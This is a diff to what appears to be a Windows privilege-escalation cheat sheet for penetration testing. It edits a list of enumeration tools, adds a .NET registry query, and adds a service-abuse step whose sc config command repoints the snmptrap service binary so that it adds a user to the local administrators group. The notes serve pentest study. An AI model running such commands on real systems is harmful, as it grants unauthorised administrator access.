@@ -4,7 +4,7 @@
 
 DOTNET CSHARP
 
-* [SharpCollection](https://github.com/Flangvik/SharpCollection) (Full collection of compiled WinPEAS, SeatBelt, SharpUP, etc.)
+* [SharpCollection](https://github.com/Flangvik/SharpCollection) (Flangvik collection of compiled WinPEAS, SeatBelt, SharpUP, etc.)
 * [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) (Favorite so far)
 * [Seatbelt](https://github.com/GhostPack/Seatbelt)
 * [SharpUp](https://github.com/GhostPack/SharpUp)
@@ -38,6 +38,8 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 wmic os get lastbootuptime
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
 
 hostname
 C:\WINDOWS\System32\drivers\etc\hosts
@@ -123,6 +125,7 @@ net localgroup administrators
 
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
+
 ```
 
 ---
@@ -346,6 +349,12 @@ Write-ServiceBinary
 ```
 
 ### Manual exploit Binary Path
+
+Find modifiable executable (from SharpUp) and change binary path name 
+
+```bash
+sc config "snmptrap" binPath= "net localgroup administrators <username> /add"
+```
 
 > Tested on Windows XP SP1
 
